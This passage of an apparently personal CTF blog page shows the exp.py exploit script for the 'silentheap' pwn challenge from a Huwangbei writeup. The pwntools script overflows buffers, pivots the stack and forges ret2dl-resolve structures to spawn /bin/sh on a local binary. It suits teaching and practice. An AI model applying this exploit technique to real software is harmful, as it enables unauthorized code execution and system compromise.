<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"DEBUG"</span></span><br><span class="line"><span class="comment">#s = remote('152.136.21.148',12047)</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./silentheap'</span>)</span><br><span class="line">gadgets = [<span class="number">0x3d0d3</span>,<span class="number">0x3d0d5</span>,<span class="number">0x3d0d9</span>,<span class="number">0x3d0e0</span>,<span class="number">0x67a7f</span>,<span class="number">0x67a80</span>,<span class="number">0x137e5e</span>,<span class="number">0x137e5f</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_0</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_1</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(s,idx)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'3'</span>)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(s,idx)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'4'</span>)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(s,idx)</span>:</span></span><br><span class="line">    s.sendline(<span class="string">'5'</span>)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(s)</span>:</span></span><br><span class="line">    p_ret = <span class="number">0x0804841d</span></span><br><span class="line">    p2_ret = <span class="number">0x08048aca</span></span><br><span class="line">    p3_ret = <span class="number">0x08048ac9</span></span><br><span class="line">    p4_ret = <span class="number">0x08048ac8</span></span><br><span class="line">    a1 = <span class="string">"Darkness beyond twilight Crimson beyond blood that flows Buried in the stream of time is where your power grows I pledge myself to conquer all the foes who stand before the mighty gift bestowed in my unworthy hand Let the fools who stand before me be destroyed by the power you and I possess..."</span></span><br><span class="line">    a2 = <span class="string">"Thou who art darker than even darkness, Thou who art deeper than even the night! Thou, the Sea of Chaos, who drifts upon it, Golden Lord of Darkness! Hereby I call to thee, Hereby I swear before thee! Those who would stand against us, All those who are fools, By the power you and I possess, Grant destruction equally upon them all!"</span></span><br><span class="line"></span><br><span class="line">    dynamic= <span class="number">0x08049f14</span></span><br><span class="line">    strtab = <span class="number">0x080482cc</span></span><br><span class="line">    symtab = <span class="number">0x080481dc</span></span><br><span class="line">    rel_plt = <span class="number">0x080483b4</span></span><br><span class="line">    write_(s,<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#s.sendline(a1)</span></span><br><span class="line">    s.sendline(<span class="string">'A'</span>*<span class="number">0x148</span>)</span><br><span class="line">    write_(s,<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#s.sendline(a2)</span></span><br><span class="line">    s.sendline(p32(<span class="number">0x08048690</span>)*(<span class="number">0x348</span>/<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        malloc_1(s)</span><br><span class="line">    free(s,<span class="number">9</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x080489ba')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x080489ba')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x08048694')</span></span><br><span class="line">    <span class="comment">#gdb.attach(s,'b* 0x80486ac')</span></span><br><span class="line">    run(s,<span class="number">9</span>)</span><br><span class="line">    bss_1 = elf.bss()+<span class="number">0x100</span></span><br><span class="line">    log.success(<span class="string">'bss1 addr =&gt; '</span> + hex(bss_1))</span><br><span class="line">    bss_2 = elf.bss()+<span class="number">0x200</span></span><br><span class="line">    read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">    resolve_plt = <span class="number">0x08048420</span></span><br><span class="line">    leave_ret = <span class="number">0x08048538</span></span><br><span class="line">    pay = <span class="string">'A'</span>*<span class="number">0x12</span></span><br><span class="line">    pay += p32(bss_1)</span><br><span class="line">    pay += p32(read_plt) + p32(<span class="number">0x08048ac8</span>) + p32(<span class="number">0</span>) + p32(bss_1) + p32(<span class="number">0x100</span>) + p32(bss_1) + p32(leave_ret)</span><br><span class="line">    s.sendline(pay)</span><br><span class="line">    <span class="comment">#calc</span></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    fake_data_addr = bss_1 + <span class="number">0x40</span></span><br><span class="line">    fake_rel_off = fake_data_addr - rel_plt</span><br><span class="line">    fake_sym_off = (fake_data_addr + <span class="number">0x10</span> - symtab) / <span class="number">0x10</span></span><br><span class="line">    log.info(<span class="string">'fake sym off =&gt; '</span> + hex(fake_sym_off))</span><br><span class="line">    fake_str_off = (fake_data_addr+<span class="number">0xc</span>+<span class="number">0x10</span>-strtab)</span><br><span class="line">    binsh_addr = (fake_data_addr+<span class="number">0xc</span>+<span class="number">0x10</span>+<span class="number">0x7</span>)</span><br><span class="line">    <span class="comment">#set structs</span></span><br><span class="line">    fake_rel = p32(free_got) + p32((fake_sym_off&lt;&lt;<span class="number">8</span>)+<span class="number">7</span>)</span><br><span class="line">    fake_sym = p32(fake_str_off)+p32(<span class="number">0</span>)*<span class="number">2</span>+chr(<span class="number">0x12</span>)+chr(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line">    strings = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = p32(<span class="number">0</span>) + p32(resolve_plt) + p32(fake_rel_off)+<span class="string">"a"</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x3c</span>,<span class="string">'a'</span>)</span><br><span class="line">    payload += p32(binsh_addr)</span><br><span class="line">    payload += fake_rel + <span class="string">'a'</span>*<span class="number">4</span> + fake_sym + strings</span><br><span class="line">    binsh_addr = <span class="number">0x0804ab20</span>+<span class="number">0x8</span></span><br><span class="line">    buf = p32(bss_1)+p32(p3_ret)+<span class="string">"/bin/sh\x00"</span>+p32(bss_1)+p32(<span class="number">0xf7dea000</span>+<span class="number">0xbf740</span>)+p32(<span class="number">0x08048406</span>)+p32(binsh_addr)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    s.send(buf)</span><br><span class="line">    s.sendline(<span class="string">"ls"</span>)</span><br><span class="line">    data = s.recv()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> <span class="string">"smashing"</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        s.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = process(<span class="string">'./silentheap'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn(s)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            s.close()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            s.close()</span><br></pre></td></tr></table></figure>
      
    </div>

    

    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的支持将鼓励我继续创作</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
        <p>Alipay</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/12/OGEEK/" rel="next" title="OGEEK CTF">
                <i class="fa fa-chevron-left"></i> OGEEK CTF
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/12/12/N1CTF2019/" rel="prev" title="N1CTF2019 部分pwn题解">
                N1CTF2019 部分pwn题解 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
            
              <p class="site-author-name" itemprop="name">ama2in9</p>
              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">63</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">32</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
            </nav>
          

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/helica" title="Helica" target="_blank">Helica</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ble55ing.github.io/" title="blessing" target="_blank">blessing</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#护网杯-pwn-writeup"><span class="nav-number">1.</span> <span class="nav-text">护网杯 pwn writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mergeheap"><span class="nav-number">1.1.</span> <span class="nav-text">mergeheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flower"><span class="nav-number">1.2.</span> <span class="nav-text">flower</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#silentheap"><span class="nav-number">1.3.</span> <span class="nav-text">silentheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.3.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序逻辑"><span class="nav-number">1.3.2.</span> <span class="nav-text">程序逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">exp.py</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ama2in9</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  

  
    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
  

  
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'http://yoursite.com/2019/12/12/Huwangbei/';
        this.page.identifier = '2019/12/12/Huwangbei/';
        this.page.title = '护网杯预选赛pwn部分writeup';
        };
      function loadComments () {
        var d = document, s = d.createElement('script');
        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      }
      
        loadComments();
      
    </script>
  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
        placeholder: '',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: true
    });
  </script>



  





  

  

  

  

  
  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
</html>
